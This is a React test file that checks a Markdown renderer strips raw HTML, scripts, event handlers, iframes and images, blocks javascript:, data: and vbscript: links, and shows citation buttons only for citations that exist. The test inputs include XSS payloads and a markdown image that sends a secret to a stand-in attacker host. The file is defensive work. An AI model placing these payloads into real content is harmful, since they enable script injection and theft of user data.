import { describe, expect, it, vi } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import Markdown from '../components/Markdown';
import { safeUrl } from '../lib/markdown';

describe('safe markdown', () => {
  it('never renders raw HTML, scripts or event handlers', () => {
    const { container } = render(
      <Markdown text={'Hello <script>window.pwned=1</script><img src=x onerror="alert(1)"><iframe src="https://evil"></iframe> **bold**'} />,
    );
    expect(container.querySelector('script, iframe, img')).toBeNull();
    expect(container.innerHTML).not.toMatch(/onerror/);
    expect(container.querySelector('strong')).toHaveTextContent('bold');
  });

  it('drops markdown images (exfiltration channel)', () => {
    const { container } = render(<Markdown text={'![secret](https://attacker.example/p.png?d=SECRET)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('[image: secret]');
  });

  it('neutralises dangerous link protocols', () => {
    const { container } = render(
      <Markdown text={'[a](javascript:alert(1)) [b](data:text/html,<b>x</b>) [c](vbscript:x) [d](https://ok.example) [e](JaVaScRiPt:alert(1))'} />,
    );
    const links = [...container.querySelectorAll('a')];
    expect(links).toHaveLength(1);
    expect(links[0]).toHaveAttribute('href', 'https://ok.example');
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    expect(safeUrl(' javascript:alert(1)')).toBe('');
    expect(safeUrl('mailto:a@b.c')).toBe('mailto:a@b.c');
  });

  it('turns [n] into citation buttons only for citations that exist', () => {
    const onCite = vi.fn();
    const citations = [{ index: 1, filename: 'a.pdf', page_number: 3, chunk_id: 9, document_id: 2 }];
    render(<Markdown text={'Fact one [1]. Invented [7].'} citations={citations} onCite={onCite} />);
    const btn = screen.getByRole('button', { name: /Source 1: a.pdf, page 3/ });
    fireEvent.click(btn);
    expect(onCite).toHaveBeenCalledWith(citations[0]);
    expect(screen.queryByRole('button', { name: /Source 7/ })).toBeNull();
    expect(screen.getByText(/Invented \[7\]/)).toBeInTheDocument();
  });
});
